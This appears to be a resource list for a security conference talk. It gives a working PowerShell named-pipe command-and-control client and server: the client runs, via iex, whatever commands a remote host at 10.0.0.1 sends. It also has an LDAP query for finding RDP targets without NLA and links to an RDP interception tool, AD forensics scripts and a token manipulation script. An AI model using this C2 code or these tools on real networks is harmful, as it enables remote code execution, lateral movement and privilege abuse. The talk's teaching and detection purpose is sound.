<b>Scripts, tools and commands shown or mentioned in the demos of this talk:</B>
<br><br>
<b>Named pipes C2:</b>

client side -

$pipe = new-object System.IO.Pipes.NamedPipeClientStream '10.0.0.1','mypipe','In'; $pipe.Connect(); $sr = new-object System.IO.StreamReader $pipe; while (($data = $sr.ReadLine()) -ne $null) { iex $data }

#$sr.Dispose(); $pipe.Dispose() 

Server side -

$pipe = new-object System.IO.Pipes.NamedPipeServerStream 'mypipe','Out'; $pipe.WaitForConnection(); $sw = new-object System.IO.StreamWriter $pipe; $sw.AutoFlush = $true; $sw.WriteLine("whoami")

#$sw.Dispose(); $pipe.Dispose()

<br>
<b>Detecting targets ‘Living off the land’ (RDP hosts without NLA enforced):</b>

([adsisearcher]'(&(serviceprincipalname=*TERMSRV*)(operatingsystem=*windows*server*200*))').FindAll()

<br>
<b>RDP AitM:</b>

https://github.com/SySS-Research/Seth

<br>
<b>Track past changes in AD accounts without logs:</b>

https://github.com/YossiSassi/AD-Replication-Metadata

<br>
<b>Get change history for AD group memberships:</b>

https://github.com/YossiSassi/Get-ADGroupChanges

<br>
<b>Token duplication (one option out of many):</b>

https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-TokenManipulation.ps1
